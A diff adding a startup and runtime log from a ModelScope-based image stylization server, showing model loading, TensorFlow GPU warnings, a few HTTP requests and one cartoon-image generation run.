@@ -1,0 +1,1746 @@
+nohup: ignoring input
+2023-03-27 17:05:44,936 - modelscope - INFO - PyTorch version 1.12.1 Found.
+2023-03-27 17:05:44,936 - modelscope - INFO - TensorFlow version 2.11.0 Found.
+2023-03-27 17:05:44,936 - modelscope - INFO - Loading ast index from /root/.cache/modelscope/ast_indexer
+2023-03-27 17:05:44,990 - modelscope - INFO - Loading done! Current index file version is 1.4.1, with md5 1090fa796f772e0fb869a1fd4628d185 and a total number of 842 components indexed
+2023-03-27 17:05:45.828436: I tensorflow/core/platform/cpu_feature_guard.cc:193] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 AVX512F AVX512_VNNI FMA
+To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
+2023-03-27 17:05:46.026154: I tensorflow/core/util/port.cc:104] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.
+2023-03-27 17:05:46.678589: W tensorflow/compiler/xla/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libnvinfer.so.7'; dlerror: libnvinfer.so.7: cannot open shared object file: No such file or directory; LD_LIBRARY_PATH: /root/anaconda3/envs/magicImage/lib/python3.10/site-packages/cv2/../../lib64:
+2023-03-27 17:05:46.678682: W tensorflow/compiler/xla/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libnvinfer_plugin.so.7'; dlerror: libnvinfer_plugin.so.7: cannot open shared object file: No such file or directory; LD_LIBRARY_PATH: /root/anaconda3/envs/magicImage/lib/python3.10/site-packages/cv2/../../lib64:
+2023-03-27 17:05:46.678694: W tensorflow/compiler/tf2tensorrt/utils/py_utils.cc:38] TF-TRT Warning: Cannot dlopen some TensorRT libraries. If you would like to use Nvidia GPU with TensorRT, please make sure the missing libraries mentioned above are installed properly.
+2023-03-27 17:05:48,534 - modelscope - INFO - Model revision not specified, use the latest revision: v1.0.0
+2023-03-27 17:05:48,968 - modelscope - INFO - initiate model from /root/.cache/modelscope/hub/damo/cv_unet_skin-retouching
+2023-03-27 17:05:48,968 - modelscope - INFO - initiate model from location /root/.cache/modelscope/hub/damo/cv_unet_skin-retouching.
+2023-03-27 17:05:48,978 - modelscope - WARNING - No preprocessor field found in cfg.
+2023-03-27 17:05:48,978 - modelscope - WARNING - No val key and type key found in preprocessor domain of configuration.json file.
+2023-03-27 17:05:48,978 - modelscope - WARNING - Cannot find available config to build preprocessor at mode inference, current config: {'model_dir': '/root/.cache/modelscope/hub/damo/cv_unet_skin-retouching'}. trying to build by task and model information.
+2023-03-27 17:05:48,978 - modelscope - WARNING - Find task: skin-retouching, model type: None. Insufficient information to build preprocessor, skip building preprocessor
+2023-03-27 17:05:54,297 - modelscope - INFO - Model revision not specified, use the latest revision: v2.0.2
+2023-03-27 17:05:56,072 - modelscope - INFO - initiate model from /root/.cache/modelscope/hub/damo/cv_resnet50_face-detection_retinaface
+2023-03-27 17:05:56,072 - modelscope - INFO - initiate model from location /root/.cache/modelscope/hub/damo/cv_resnet50_face-detection_retinaface.
+2023-03-27 17:05:56,075 - modelscope - WARNING - No preprocessor field found in cfg.
+2023-03-27 17:05:56,075 - modelscope - WARNING - No val key and type key found in preprocessor domain of configuration.json file.
+2023-03-27 17:05:56,075 - modelscope - WARNING - Cannot find available config to build preprocessor at mode inference, current config: {'model_dir': '/root/.cache/modelscope/hub/damo/cv_resnet50_face-detection_retinaface'}. trying to build by task and model information.
+2023-03-27 17:05:56,075 - modelscope - WARNING - Find task: face-detection, model type: None. Insufficient information to build preprocessor, skip building preprocessor
+2023-03-27 17:05:56,076 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_resnet50_face-detection_retinaface/pytorch_model.pt
+2023-03-27 17:05:56,598 - modelscope - INFO - load model done
+2023-03-27 17:05:57.520763: I tensorflow/core/platform/cpu_feature_guard.cc:193] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 AVX512F AVX512_VNNI FMA
+To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
+2023-03-27 17:05:57.522060: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:05:57.523692: W tensorflow/compiler/xla/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcusolver.so.11'; dlerror: libcusolver.so.11: cannot open shared object file: No such file or directory; LD_LIBRARY_PATH: /root/anaconda3/envs/magicImage/lib/python3.10/site-packages/cv2/../../lib64:
+2023-03-27 17:05:57.523800: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+WARNING:tensorflow:From /root/anaconda3/envs/magicImage/lib/python3.10/site-packages/modelscope/pipelines/cv/skin_retouching_pipeline.py:84: FastGFile.__init__ (from tensorflow.python.platform.gfile) is deprecated and will be removed in a future version.
+Instructions for updating:
+Use tf.gfile.GFile.
+2023-03-27 17:05:58.452858: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:357] MLIR V1 optimization pass is not enabled
+2023-03-27 17:05:59,791 - modelscope - INFO - Model revision not specified, use the latest revision: v1.0.0
+2023-03-27 17:06:05,776 - modelscope - INFO - initiate model from /root/.cache/modelscope/hub/damo/cv_flow-based-body-reshaping_damo
+2023-03-27 17:06:05,776 - modelscope - INFO - initiate model from location /root/.cache/modelscope/hub/damo/cv_flow-based-body-reshaping_damo.
+2023-03-27 17:06:05,777 - modelscope - INFO - initialize model from /root/.cache/modelscope/hub/damo/cv_flow-based-body-reshaping_damo
+2023-03-27 17:06:06,528 - modelscope - INFO - load body reshaping model done
+2023-03-27 17:06:07,033 - modelscope - INFO - load pose model done
+2023-03-27 17:06:07,039 - modelscope - WARNING - No preprocessor field found in cfg.
+2023-03-27 17:06:07,039 - modelscope - WARNING - No val key and type key found in preprocessor domain of configuration.json file.
+2023-03-27 17:06:07,039 - modelscope - WARNING - Cannot find available config to build preprocessor at mode inference, current config: {'model_dir': '/root/.cache/modelscope/hub/damo/cv_flow-based-body-reshaping_damo'}. trying to build by task and model information.
+2023-03-27 17:06:07,040 - modelscope - WARNING - No preprocessor key ('image-body-reshaping', 'image-body-reshaping') found in PREPROCESSOR_MAP, skip building preprocessor.
+2023-03-27 17:06:07,041 - modelscope - INFO - body reshaping model init done
+2023-03-27 17:06:08,132 - modelscope - INFO - Model revision not specified, use the latest revision: v1.0.3
+2023-03-27 17:06:10,569 - modelscope - INFO - initiate model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon_compound-models
+2023-03-27 17:06:10,569 - modelscope - INFO - initiate model from location /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon_compound-models.
+2023-03-27 17:06:10,571 - modelscope - WARNING - No preprocessor field found in cfg.
+2023-03-27 17:06:10,571 - modelscope - WARNING - No val key and type key found in preprocessor domain of configuration.json file.
+2023-03-27 17:06:10,571 - modelscope - WARNING - Cannot find available config to build preprocessor at mode inference, current config: {'model_dir': '/root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon_compound-models'}. trying to build by task and model information.
+2023-03-27 17:06:10,571 - modelscope - WARNING - Find task: image-portrait-stylization, model type: None. Insufficient information to build preprocessor, skip building preprocessor
+2023-03-27 17:06:10.573333: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:10.574730: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:10.690480: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:10.691814: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:10.882223: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:10.883449: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:10,883 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon_compound-models/cartoon_h.pb
+2023-03-27 17:06:10,931 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon_compound-models/cartoon_h.pb done.
+2023-03-27 17:06:10.932767: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:10.933993: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:10,934 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon_compound-models/cartoon_bg.pb
+2023-03-27 17:06:10,990 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon_compound-models/cartoon_bg.pb done.
+2023-03-27 17:06:12,298 - modelscope - INFO - Model revision not specified, use the latest revision: v1.0.1
+2023-03-27 17:06:14,776 - modelscope - INFO - initiate model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-handdrawn_compound-models
+2023-03-27 17:06:14,776 - modelscope - INFO - initiate model from location /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-handdrawn_compound-models.
+2023-03-27 17:06:14,779 - modelscope - WARNING - No preprocessor field found in cfg.
+2023-03-27 17:06:14,779 - modelscope - WARNING - No val key and type key found in preprocessor domain of configuration.json file.
+2023-03-27 17:06:14,779 - modelscope - WARNING - Cannot find available config to build preprocessor at mode inference, current config: {'model_dir': '/root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-handdrawn_compound-models'}. trying to build by task and model information.
+2023-03-27 17:06:14,779 - modelscope - WARNING - Find task: image-portrait-stylization, model type: None. Insufficient information to build preprocessor, skip building preprocessor
+2023-03-27 17:06:14.780846: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:14.782193: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:14.897592: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:14.898825: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:15.085185: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:15.086422: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:15,086 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-handdrawn_compound-models/cartoon_h.pb
+2023-03-27 17:06:15,130 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-handdrawn_compound-models/cartoon_h.pb done.
+2023-03-27 17:06:15.131834: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:15.133075: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:15,133 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-handdrawn_compound-models/cartoon_bg.pb
+2023-03-27 17:06:15,187 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-handdrawn_compound-models/cartoon_bg.pb done.
+2023-03-27 17:06:16,301 - modelscope - INFO - Model revision not specified, use the latest revision: v1.0.1
+2023-03-27 17:06:18,795 - modelscope - INFO - initiate model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-3d_compound-models
+2023-03-27 17:06:18,795 - modelscope - INFO - initiate model from location /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-3d_compound-models.
+2023-03-27 17:06:18,798 - modelscope - WARNING - No preprocessor field found in cfg.
+2023-03-27 17:06:18,798 - modelscope - WARNING - No val key and type key found in preprocessor domain of configuration.json file.
+2023-03-27 17:06:18,798 - modelscope - WARNING - Cannot find available config to build preprocessor at mode inference, current config: {'model_dir': '/root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-3d_compound-models'}. trying to build by task and model information.
+2023-03-27 17:06:18,798 - modelscope - WARNING - Find task: image-portrait-stylization, model type: None. Insufficient information to build preprocessor, skip building preprocessor
+2023-03-27 17:06:18.800055: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:18.801405: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:19.066805: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:19.068037: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:19.256679: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:19.257906: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:19,258 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-3d_compound-models/cartoon_h.pb
+2023-03-27 17:06:19,302 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-3d_compound-models/cartoon_h.pb done.
+2023-03-27 17:06:19.303206: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:19.304454: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:19,304 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-3d_compound-models/cartoon_bg.pb
+2023-03-27 17:06:19,359 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-3d_compound-models/cartoon_bg.pb done.
+2023-03-27 17:06:20,541 - modelscope - INFO - Model revision not specified, use the latest revision: v1.0.1
+2023-03-27 17:06:22,713 - modelscope - INFO - initiate model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-artstyle_compound-models
+2023-03-27 17:06:22,713 - modelscope - INFO - initiate model from location /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-artstyle_compound-models.
+2023-03-27 17:06:22,715 - modelscope - WARNING - No preprocessor field found in cfg.
+2023-03-27 17:06:22,715 - modelscope - WARNING - No val key and type key found in preprocessor domain of configuration.json file.
+2023-03-27 17:06:22,715 - modelscope - WARNING - Cannot find available config to build preprocessor at mode inference, current config: {'model_dir': '/root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-artstyle_compound-models'}. trying to build by task and model information.
+2023-03-27 17:06:22,716 - modelscope - WARNING - Find task: image-portrait-stylization, model type: None. Insufficient information to build preprocessor, skip building preprocessor
+2023-03-27 17:06:22.717579: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:22.718934: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:22.833598: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:22.834838: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:23.022897: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:23.024133: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:23,024 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-artstyle_compound-models/cartoon_h.pb
+2023-03-27 17:06:23,069 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-artstyle_compound-models/cartoon_h.pb done.
+2023-03-27 17:06:23.070065: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:23.071309: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:23,071 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-artstyle_compound-models/cartoon_bg.pb
+2023-03-27 17:06:23,126 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-artstyle_compound-models/cartoon_bg.pb done.
+2023-03-27 17:06:24,112 - modelscope - INFO - Use user-specified model revision: v1.0.0
+2023-03-27 17:06:24,536 - modelscope - INFO - initiate model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-design_compound-models
+2023-03-27 17:06:24,536 - modelscope - INFO - initiate model from location /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-design_compound-models.
+2023-03-27 17:06:24,539 - modelscope - WARNING - No preprocessor field found in cfg.
+2023-03-27 17:06:24,539 - modelscope - WARNING - No val key and type key found in preprocessor domain of configuration.json file.
+2023-03-27 17:06:24,539 - modelscope - WARNING - Cannot find available config to build preprocessor at mode inference, current config: {'model_dir': '/root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-design_compound-models'}. trying to build by task and model information.
+2023-03-27 17:06:24,539 - modelscope - WARNING - Find task: image-portrait-stylization, model type: None. Insufficient information to build preprocessor, skip building preprocessor
+2023-03-27 17:06:24.541046: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:24.542386: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:24.657229: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:24.658570: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:24.846729: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:24.847963: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:24,848 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-design_compound-models/cartoon_h.pb
+2023-03-27 17:06:24,892 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-design_compound-models/cartoon_h.pb done.
+2023-03-27 17:06:24.893018: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:24.894261: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:24,894 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-design_compound-models/cartoon_bg.pb
+2023-03-27 17:06:24,950 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-design_compound-models/cartoon_bg.pb done.
+2023-03-27 17:06:25,939 - modelscope - INFO - Use user-specified model revision: v1.0.0
+2023-03-27 17:06:26,371 - modelscope - INFO - initiate model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-illustration_compound-models
+2023-03-27 17:06:26,371 - modelscope - INFO - initiate model from location /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-illustration_compound-models.
+2023-03-27 17:06:26,374 - modelscope - WARNING - No preprocessor field found in cfg.
+2023-03-27 17:06:26,374 - modelscope - WARNING - No val key and type key found in preprocessor domain of configuration.json file.
+2023-03-27 17:06:26,374 - modelscope - WARNING - Cannot find available config to build preprocessor at mode inference, current config: {'model_dir': '/root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-illustration_compound-models'}. trying to build by task and model information.
+2023-03-27 17:06:26,374 - modelscope - WARNING - Find task: image-portrait-stylization, model type: None. Insufficient information to build preprocessor, skip building preprocessor
+2023-03-27 17:06:26.375943: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:26.377286: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:26.502369: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:26.503610: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:26.692536: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:26.693871: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:26,693 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-illustration_compound-models/cartoon_h.pb
+2023-03-27 17:06:26,738 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-illustration_compound-models/cartoon_h.pb done.
+2023-03-27 17:06:26.738933: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:06:26.740177: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+2023-03-27 17:06:26,740 - modelscope - INFO - loading model from /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-illustration_compound-models/cartoon_bg.pb
+2023-03-27 17:06:26,795 - modelscope - INFO - load model /root/.cache/modelscope/hub/damo/cv_unet_person-image-cartoon-sd-illustration_compound-models/cartoon_bg.pb done.
+2023-03-27 17:06:27,791 - modelscope - INFO - Use user-specified model revision: v1.0.0
+`text_config_dict` is provided which will be used to initialize `CLIPTextConfig`. The value `text_config["id2label"]` will be overriden.
+INFO:     Started server process [23359]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+INFO:     220.194.45.154:0 - "POST /feedback HTTP/1.0" 200 OK
+INFO:     167.248.133.37:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     167.248.133.37:0 - "GET / HTTP/1.0" 404 Not Found
+WARNING:tensorflow:From /root/anaconda3/envs/magicImage/lib/python3.10/site-packages/modelscope/utils/device.py:60: is_gpu_available (from tensorflow.python.framework.test_util) is deprecated and will be removed in a future version.
+Instructions for updating:
+Use `tf.config.list_physical_devices('GPU')` instead.
+2023-03-27 17:08:33.420082: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:08:33.421451: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+original image shape: (854, 640, 3)
+Do not need resize!
+No face detected!
+File: ../gen_images/nozrp4bykjrr_3D漫画.png is saved, done!
